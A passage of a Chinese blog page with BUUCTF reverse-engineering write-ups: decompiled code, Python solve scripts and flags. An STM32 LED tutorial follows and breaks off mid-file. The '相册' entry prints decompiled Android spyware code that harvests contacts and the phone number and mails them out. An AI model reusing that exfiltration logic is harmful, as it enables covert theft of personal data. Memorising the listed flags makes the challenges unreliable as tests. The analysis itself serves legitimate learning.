<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main_0</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  HANDLE Thread; <span class="comment">// [esp+D0h] [ebp-14h]</span></span><br><span class="line">  HANDLE hObject; <span class="comment">// [esp+DCh] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  j_banner();</span><br><span class="line">  ::hObject = CreateMutexW(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  j_strcpy(Destination, &amp;Source);</span><br><span class="line">  hObject = CreateThread(<span class="number">0</span>, <span class="number">0</span>, StartAddress, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  Thread = CreateThread(<span class="number">0</span>, <span class="number">0</span>, sub_41119F, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  CloseHandle(hObject);</span><br><span class="line">  CloseHandle(Thread);</span><br><span class="line">  <span class="keyword">while</span> ( dword_418008 != <span class="number">-1</span> )</span><br><span class="line">    ;</span><br><span class="line">  sub_411190();</span><br><span class="line">  CloseHandle(::hObject);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>CreateMutexW</code>创建一个互斥锁，<code>CreateThread</code>创建一个线程。这里查资料发现<code>CreateThread</code>返回的是一个线程句柄，之后是可以立即通过<code>CloseHandle</code>关闭句柄的，因为线程句柄和线程本身的生命周期不同，线程句柄被关闭并不意味着线程立即结束，所以如果一个线程不需要任何干预，在创建之后就关闭句柄即可。第一个线程的函数如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __stdcall __noreturn <span class="title function_">StartAddress_0</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    WaitForSingleObject(hObject, <span class="number">0xFFFFFFFF</span>);</span><br><span class="line">    <span class="keyword">if</span> ( bytes_remained &gt; <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_41112C(&amp;Source, bytes_remained);</span><br><span class="line">      --bytes_remained;</span><br><span class="line">      Sleep(<span class="number">0x64</span>u);</span><br><span class="line">    &#125;</span><br><span class="line">    ReleaseMutex(hObject);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// positive sp value has been detected, the output may be wrong!</span></span><br><span class="line"><span class="type">void</span> __cdecl <span class="title function_">encrypter</span><span class="params">(<span class="type">char</span> *buffer, <span class="type">int</span> arg)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> byte; <span class="comment">// [esp+D3h] [ebp-5h]</span></span><br><span class="line"></span><br><span class="line">  byte = buffer[arg];</span><br><span class="line">  <span class="keyword">if</span> ( (byte &lt; <span class="string">&#x27;a&#x27;</span> || byte &gt; <span class="string">&#x27;z&#x27;</span>) &amp;&amp; (byte &lt; <span class="string">&#x27;A&#x27;</span> || byte &gt; <span class="string">&#x27;Z&#x27;</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( byte &lt; <span class="string">&#x27;a&#x27;</span> || byte &gt; <span class="string">&#x27;z&#x27;</span> )</span><br><span class="line">    buffer[arg] = Palphabet[<span class="number">0</span>][buffer[arg] - <span class="number">0x26</span>];</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    buffer[arg] = Palphabet[<span class="number">0</span>][buffer[arg] - <span class="number">0x60</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中<code>sub_41112C</code>中有这一段处理，规定所有输入只能为字母，然后进行了处理。而另一个线程的代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __stdcall __noreturn <span class="title function_">sub_411B10</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    WaitForSingleObject(hObject, <span class="number">0xFFFFFFFF</span>);</span><br><span class="line">    <span class="keyword">if</span> ( bytes_remained &gt; <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      Sleep(<span class="number">100u</span>);</span><br><span class="line">      --bytes_remained;</span><br><span class="line">    &#125;</span><br><span class="line">    ReleaseMutex(hObject);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这两个线程执行完之后，后面进行一次字符串比较，将输入处理后的字符串与<code>TOiZiZtOrYaToUwPnToBsOaOapsyS</code>进行非直接比较。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_411880</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+D0h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">29</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(&amp;Source + i) != off_418004[i] )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;\nflag&#123;%s&#125;\n\n&quot;</span>, Destination);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>直接上脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">alphabet = <span class="string">&#x27;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm&#x27;</span></span><br><span class="line">cipher = <span class="string">&#x27;TOiZiZtOrYaToUwPnToBsOaOapsyS&#x27;</span></span><br><span class="line">cipher1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_char</span>(<span class="params">c</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(alphabet)):</span><br><span class="line">        <span class="keyword">if</span> c == alphabet[i]:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">29</span>):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        cipher1 += cipher[i]</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> find_char(cipher[i]) &lt;= <span class="number">26</span>:</span><br><span class="line">        cipher1 += <span class="built_in">chr</span>(find_char(cipher[i]) + <span class="number">0x60</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cipher1 += <span class="built_in">chr</span>(find_char(cipher[i]) + <span class="number">0x26</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(cipher1)</span><br></pre></td></tr></table></figure>
<p>求出来一个高度疑似flag，但是交上去不对：flag{ThisisthreadofwindowshahaIsES}。于是彻底禁了反调试之后开调。发现输入的字符串处理完之后是这样：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ThisisthreadofwindowshahaIsES</span><br><span class="line">xhPsPsXhLeWdHfBiGdHwZhWhWIZEz</span><br></pre></td></tr></table></figure>
<p>可见，第2、4、6、…个字符不变，那到底是什么地方出了问题呢？我换了一下处理的奇偶数，然后程序能输出flag，但是那个东西就纯粹拼不出来什么单词了，后来查wp才发现最后还有一位，那这就不是我的问题了。flag{ThisisthreadofwindowshahaIsESE}</p>
<h1 id="buu034-wustctf2020level3"><a class="markdownIt-Anchor" href="#buu034-wustctf2020level3"></a> buu034-[WUSTCTF2020]level3</h1>
<p>一个换了表的base64，看到程序里面有个<code>O_OLookAtYou</code>函数获取换表操作，换完直接解码。</p>
<p>wctf2020{Base64_is_the_start_of_reverse}</p>
<h1 id="buu035-相册"><a class="markdownIt-Anchor" href="#buu035-相册"></a> buu035-相册</h1>
<p>一道Android逆向，用jadx打开后首先看AndroidMenifest.xml。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span> <span class="attr">android:icon</span>=<span class="string">&quot;@drawable/iocn&quot;</span> <span class="attr">android:name</span>=<span class="string">&quot;cn.baidujiayuan.ver5304.C1&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>找到上面这个项，这里的action是<code>android.intent.action.MAIN</code>，因此确定了apk的入口是<code>cn.baidujiayuan.ver5304.C1</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    getPackageManager().setComponentEnabledSetting(getComponentName(), <span class="number">2</span>, <span class="number">1</span>);</span><br><span class="line">    A2.log(<span class="string">&quot;安装后执行这个&quot;</span>);</span><br><span class="line">    startService(<span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="built_in">this</span>, M2.class));</span><br><span class="line">    readContacts();</span><br><span class="line">    SmsManager.getDefault();</span><br><span class="line">    ((TelephonyManager) getSystemService(<span class="string">&quot;phone&quot;</span>)).getLine1Number();</span><br><span class="line">    A2.sendMsg(C2.phoneNumber, A2.getInstallFlag(<span class="built_in">this</span>, <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">SmsTas</span>(<span class="string">&quot;&quot;</span>, <span class="built_in">this</span>).execute(<span class="keyword">new</span> <span class="title class_">Integer</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        A2.log(<span class="string">&quot;邮件发送错误&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">MailTask</span>(<span class="string">&quot;&quot;</span>, <span class="built_in">this</span>).execute(<span class="keyword">new</span> <span class="title class_">Integer</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e2) &#123;</span><br><span class="line">        A2.log(<span class="string">&quot;邮件发送错误&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    check();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里面有一个<code>sendMsg</code>方法，疑似是发送邮件。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">sendMailByJavaMail</span><span class="params">(String mailto, String title, String mailmsg)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!debug) &#123;</span><br><span class="line">        <span class="type">Mail</span> <span class="variable">m</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Mail</span>(C2.MAILUSER, C2.MAILPASS);</span><br><span class="line">        m.set_host(C2.MAILHOST);</span><br><span class="line">        m.set_port(C2.PORT);</span><br><span class="line">        m.set_debuggable(<span class="literal">true</span>);</span><br><span class="line">        m.set_to(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;mailto&#125;);</span><br><span class="line">        m.set_from(C2.MAILFROME);</span><br><span class="line">        m.set_subject(title);</span><br><span class="line">        m.setBody(mailmsg);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (m.send()) &#123;</span><br><span class="line">                Log.i(<span class="string">&quot;IcetestActivity&quot;</span>, <span class="string">&quot;Email was sent successfully.&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                Log.i(<span class="string">&quot;IcetestActivity&quot;</span>, <span class="string">&quot;Email was sent failed.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            Log.e(<span class="string">&quot;MailApp&quot;</span>, <span class="string">&quot;Could not send email&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这是在A2中发现的发送邮件的方法，其中有个<code>MAILSERVER</code>，定位一下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">MAILSERVER</span> <span class="operator">=</span> Base64.decode(NativeMethod.m());</span><br></pre></td></tr></table></figure>
<p>是个Base64解码，不过解码的东西是<code>NativeMethod.m()</code></p>
<p>在lib目录里面的<code>libcore.so</code>里面找到了东西。能找到<code>Java_com_net_cn_NativeMethod_m</code>这个函数，然后返回了一个base64值，解码即可。</p>
<h1 id="buu036-flareon4igniteme"><a class="markdownIt-Anchor" href="#buu036-flareon4igniteme"></a> buu036-[FlareOn4]IgniteMe</h1>
<p>简单的windows x86程序，一个加密</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">cipher = [<span class="number">0x0D</span>, <span class="number">0x26</span>, <span class="number">0x49</span>, <span class="number">0x45</span>, <span class="number">0x2A</span>, <span class="number">0x17</span>, <span class="number">0x78</span>, <span class="number">0x44</span>, <span class="number">0x2B</span>, <span class="number">0x6C</span>, <span class="number">0x5D</span>, <span class="number">0x5E</span>, <span class="number">0x45</span>, <span class="number">0x12</span>, <span class="number">0x2F</span>, <span class="number">0x17</span>, <span class="number">0x2B</span>, <span class="number">0x44</span>, <span class="number">0x6F</span>, <span class="number">0x6E</span>, <span class="number">0x56</span>, <span class="number">0x9</span>, <span class="number">0x5F</span>, <span class="number">0x45</span>, <span class="number">0x47</span>, <span class="number">0x73</span>, <span class="number">0x26</span>, <span class="number">0x0A</span>, <span class="number">0x0D</span>, <span class="number">0x13</span>, <span class="number">0x17</span>, <span class="number">0x48</span>, <span class="number">0x42</span>, <span class="number">0x1</span>, <span class="number">0x40</span>, <span class="number">0x4D</span>, <span class="number">0x0C</span>, <span class="number">0x2</span>, <span class="number">0x69</span>, <span class="number">0x0</span>]</span><br><span class="line"></span><br><span class="line">crc = <span class="number">4</span></span><br><span class="line">plaintext = [<span class="number">0</span>] * <span class="number">40</span></span><br><span class="line">idx = <span class="number">39</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> idx &gt;= <span class="number">0</span>:</span><br><span class="line">	plaintext[idx] = crc ^ cipher[idx]</span><br><span class="line">	crc = plaintext[idx]</span><br><span class="line">	idx -= <span class="number">1</span></span><br><span class="line">	</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> plaintext[:-<span class="number">1</span>]:</span><br><span class="line">	<span class="built_in">print</span>(<span class="built_in">chr</span>(i), end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>flag{R_y0u_H0t_3n0ugH_t0_1gn1t3@flare-on.com}</p>
<h1 id="buu037-wustctf2020cr0ssfun"><a class="markdownIt-Anchor" href="#buu037-wustctf2020cr0ssfun"></a> buu037-[WUSTCTF2020]Cr0ssfun</h1>
<p>wctf2020{cpp_@nd_r3verse_@re_fun}</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2024/03/29/STM32%E5%AD%A6%E4%B9%A0-1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/03/29/STM32%E5%AD%A6%E4%B9%A0-1/" class="post-title-link" itemprop="url">STM32学习 (1)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2024-03-29 12:42:50 / 修改时间：18:34:37" itemprop="dateCreated datePublished" datetime="2024-03-29T12:42:50+08:00">2024-03-29</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F/" itemprop="url" rel="index"><span itemprop="name">嵌入式</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>6k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>5 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>实验室研究需要，有关物联网的一些基础还是需要掌握的。于是开始研究实验室买的STM板子，下面通过一个官方demo进行基础内容的学习。</p>
<h1 id="准备工作"><a class="markdownIt-Anchor" href="#准备工作"></a> 准备工作</h1>
<p>我使用的开发板是STM32F429 Nucleo-144，MCU为STM32F429ZIT6，属于STM32系列中的高性能MCU。从官网查询信息可知，该MCU一共带有2MB的Flash以及256KB的RAM，核心频率可达180MHz。开发板如下图所示。</p>
<p><img src="2.jpg" alt="" /></p>
<p>下面使用Keil进行分析。在官网下载Keil之后安装，UV4目录中有IDE的启动程序UV4.exe以及包管理器PackInstaller.exe。</p>
<p>打开PackInstaller，左边选择Devices可以找到上面的MCU型号，选择后，右边有Packs和Examples。Packs为开发时可能需要的硬件支持包，包含对各类外设的处理等，Examples则是可以直接烧录到开发板上的demo示例。</p>
<p>在Pack一栏，我安装了2个Device Specific包，Generic中则安装有：</p>
<ul>
<li>ARM::CMSIS</li>
<li>ARM::CMSIS-Driver</li>
<li>ARM::CMSIS-DSP</li>
<li>ARM::CMSIS-NN</li>
<li>Keil::ARM_Compiler</li>
<li>Keil::MDK-Middleware</li>
<li>Keil::MDK-Middleware_Graphics</li>
</ul>
<p>如果需要安装其他包，只需直接点击安装即可，包管理器能够自动分析依赖并将某个包所依赖的所有包全部安装。</p>
<p>在Examples一栏中，前两个就是最简单的亮灯demo。在Install后Copy到某个目录下，使用Keil打开对应的项目文件即可打开demo。</p>
<p><img src="1.png" alt="" /></p>
<h1 id="程序分析"><a class="markdownIt-Anchor" href="#程序分析"></a> 程序分析</h1>
<p>打开Blinky项目，Source Files中只有一个Blinky.c文件，包含这个demo的主要逻辑。</p>
<p>下面简述这个demo的功能。</p>
<p>开发板下方左右各有一个按钮，左边蓝色右边黑色（黑色为复位按钮）。在MCU正上方有三个User LED，分别为LD1、LD2、LD3。将开发板上电后（USB应插入上面的USB接口而不是下面，插入后，该接口右边的COM指示灯亮起红灯，User LED右边的PWR指示灯亮起绿灯表示已经供电），在用户无操作时，LD1到LD3依次亮起绿、蓝、红三色灯，每一次点亮持续0.5s，随后熄灭，等待0.5秒后亮起下一个灯，一次循环为3s时间。在循环过程中，如果用户按下蓝色按钮，则循环暂停，正在点亮的灯会持续点亮，如果灯全部熄灭则会持续熄灭。松开按钮后循环继续进行。如果用户按下黑色按钮，循环立即停止并将状态返回至循环开始。黑色按钮不松开时循环暂停，松开后循环重新开始。黑色按钮的优先级高于蓝色按钮，如果两个按钮均按下，则循环重置。</p>
<h2 id="mainc"><a class="markdownIt-Anchor" href="#mainc"></a> main.c</h2>
<p>这个项目使用了STM32 CubeMX自动构建项目，它能够为STM32项目提供初始化代码的模板，用户只需要在该模板基础上进行开发即可。不过我们这里暂且不研究这个模板的使用，主要还是以代码为主。</p>
<p>在main.c中，最重要的就属main函数了。在blinky中，由于只需要完成用户LED的简单点亮操作，因此不需要将进行多余的初始化操作。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  HAL_Init();</span><br><span class="line">  SystemClock_Config();</span><br><span class="line">  SystemCoreClockUpdate();</span><br><span class="line">  MX_GPIO_Init();</span><br><span class="line">  osKernelInitialize();</span><br><span class="line">  osThreadNew(app_main, <span class="literal">NULL</span>, &amp;app_main_attr);</span><br><span class="line">  osKernelStart();</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里基本都是一些与初始化相关的函数。<code>HAL_Init</code>用于初始化外设，下面两个与系统时钟相关，<code>MX_GPIO_Init</code>初始化GPIO引脚，随后<code>osKernelInitialize</code>是操作系统的初始化，这里的操作系统指的是封装了CMSIS-OS的FreeRTOS。CMSIS-RTOS是一层可以封装在不同RTOS上的一个API层，能够为用户提供统一的API，便于编程。这里进行初始化之后调用了<code>osThreadNew</code>函数创建了一个线程，线程执行的函数是<code>app_main</code>，参数为NULL，即没有参数，线程属性为<code>&amp;app_main_attr</code>。线程属性定义了这个线程拥有的栈空间地址及大小，后面在Blinky.c中可以找到。随后<code>osKernelStart</code>即启动OS内核，开始执行用户线程。</p>
<h2 id="blinkyc"><a class="markdownIt-Anchor" href="#blinkyc"></a> Blinky.c</h2>
<p>Blinky.c的内容并不多：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*----------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"> * Name:    Blinky.c</span></span><br><span class="line"><span class="comment"> * Purpose: LED Flasher</span></span><br><span class="line"><span class="comment"> *----------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"> * This file is part of the uVision/ARM development tools.</span></span><br><span class="line"><span class="comment"> * This software may only be used under the terms of a valid, 